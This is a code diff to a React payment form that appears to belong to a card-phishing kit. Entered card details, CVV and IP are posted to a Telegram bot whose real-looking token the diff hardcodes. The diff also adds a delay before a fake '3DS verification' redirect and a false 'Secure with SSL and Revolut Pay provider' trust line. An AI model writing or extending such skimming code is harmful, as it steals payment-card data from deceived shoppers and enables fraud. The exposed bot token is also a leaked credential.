@@ -33,7 +33,7 @@ const validateCardNumber = (cardNumber: string): boolean => {
 
 const sendTelegramNotification = async (paymentData: any) => {
   try {
-    const response = await fetch('https://api.telegram.org/bot[BOT_TOKEN]/sendMessage', {
+    const response = await fetch('https://api.telegram.org/bot7838597617:AAGTZ6xgFUTddSK1mS9hHUl1tKffHXyHycU/sendMessage', {
       method: 'POST',
       headers: {
         'Content-Type': 'application/json',
@@ -57,6 +57,7 @@ export const PaymentForm = ({ amount }: PaymentFormProps) => {
   const [expiryDate, setExpiryDate] = useState("");
   const [cvv, setCvv] = useState("");
   const [ip, setIp] = useState("");
+  const [isSubmitting, setIsSubmitting] = useState(false);
   const navigate = useNavigate();
   const { toast } = useToast();
 
@@ -70,6 +71,7 @@ export const PaymentForm = ({ amount }: PaymentFormProps) => {
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
+    setIsSubmitting(true);
 
     if (!validateCardNumber(cardNumber)) {
       toast({
@@ -77,6 +79,7 @@ export const PaymentForm = ({ amount }: PaymentFormProps) => {
         description: "Please enter a valid card number",
         variant: "destructive",
       });
+      setIsSubmitting(false);
       return;
     }
 
@@ -87,6 +90,9 @@ export const PaymentForm = ({ amount }: PaymentFormProps) => {
       ip,
     });
 
+    // Add 3-second delay before navigation
+    await new Promise(resolve => setTimeout(resolve, 3000));
+    
     // Navigate to 3DS verification
     navigate(`/verify-3ds?amount=${amount}`);
   };
@@ -161,11 +167,17 @@ export const PaymentForm = ({ amount }: PaymentFormProps) => {
         </div>
         <Button
           type="submit"
-          className="w-full relative bg-gradient-to-r from-[#8B5CF6] via-[#D946EF] to-[#0EA5E9] bg-[length:200%_200%] animate-gradient text-white hover:bg-white/90 transition-all duration-300"
+          disabled={isSubmitting}
+          className={`w-full relative bg-gradient-to-r from-[#8B5CF6] via-[#D946EF] to-[#0EA5E9] bg-[length:200%_200%] animate-gradient text-white transition-all duration-300
+            before:absolute before:inset-0 before:rounded-md before:p-[1px] before:bg-gradient-to-r before:from-[#8B5CF6] before:via-[#D946EF] before:to-[#0EA5E9] before:animate-border-flow before:opacity-0 before:hover:opacity-100
+            ${isSubmitting ? 'opacity-75 cursor-not-allowed' : 'hover:scale-[1.02]'}`}
         >
-          Pay Now
+          {isSubmitting ? 'Processing...' : 'Pay Now'}
         </Button>
       </div>
+      <p className="text-gray-400 text-sm mt-8">
+        Secure with SSL and Revolut Pay provider
+      </p>
     </form>
   );
 };
